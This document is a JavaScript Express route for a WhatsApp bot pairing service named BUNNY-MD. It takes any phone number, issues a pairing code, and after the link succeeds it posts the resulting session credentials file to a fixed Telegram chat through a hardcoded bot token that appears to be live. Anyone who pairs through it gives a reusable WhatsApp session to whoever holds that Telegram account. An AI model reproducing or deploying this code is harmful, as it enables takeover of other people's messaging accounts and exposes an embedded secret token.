const express = require('express');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const pino = require('pino');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore
} = require('@whiskeysockets/baileys');

const router = express.Router();

const BOT_TOKEN = '8149180968:AAETze5t97w5OBtiu5tSei2yWwWozK8_82U'; // Your Telegram bot token
const TELEGRAM_ID = '7679941367'; // Your Telegram user ID
const version = [2, 3000, 1015901307];

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

router.get('/', async (req, res) => {
    let num = req.query.number;
    if (!num) return res.status(400).send({ error: 'Missing number parameter' });

    async function PairCode() {
        const { state, saveCreds } = await useMultiFileAuthState('./session');

        try {
            const sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })),
                },
                printQRInTerminal: false,
                logger: pino({ level: 'fatal' }),
                browser: ['Ubuntu', 'Chrome', '20.0.04'],
            });

            if (!sock.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(num);
                if (!res.headersSent) res.send({ code, version });
            }

            sock.ev.on('creds.update', saveCreds);

            sock.ev.on('connection.update', async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection === 'open') {
                    await delay(5000);

                    // Read and send creds.json to Telegram
                    const credsPath = './session/creds.json';
                    if (fs.existsSync(credsPath)) {
                        const form = new FormData();
                        form.append('chat_id', TELEGRAM_ID);
                        form.append('caption', `✅ *CREDS.JSON FROM BUNNY-MD*\n\nPlease upload this to your server/fork to deploy your WhatsApp bot instance.`);
                        form.append('document', fs.createReadStream(credsPath), {
                            filename: 'creds.json',
                            contentType: 'application/json'
                        });

                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                            headers: form.getHeaders()
                        });
                    }

                    // Send success message on WhatsApp
                    await sock.sendMessage(sock.user.id, {
                        text: `✅ *BUNNY-MD IS ALIVE!*\n\nYou can now use commands. Your bot is connected successfully.`
                    });

                    await delay(1000);
                    removeFile('./session');
                }

                if (connection === 'close' && lastDisconnect?.error?.output?.statusCode !== 401) {
                    console.log('Reconnecting...');
                    await delay(10000);
                    PairCode();
                }
            });
        } catch (err) {
            console.error('Service error:', err);
            removeFile('./session');
            if (!res.headersSent) res.send({ error: 'Service Unavailable', version });
        }
    }

    await PairCode();
});

process.on('uncaughtException', function (err) {
    let e = String(err);
    if (
        e.includes('conflict') ||
        e.includes('Socket connection timeout') ||
        e.includes('not-authorized') ||
        e.includes('rate-overlimit') ||
        e.includes('Connection Closed') ||
        e.includes('Timed Out') ||
        e.includes('Value not found')
    ) return;
    console.error('Caught exception:', err);
});

module.exports = router;
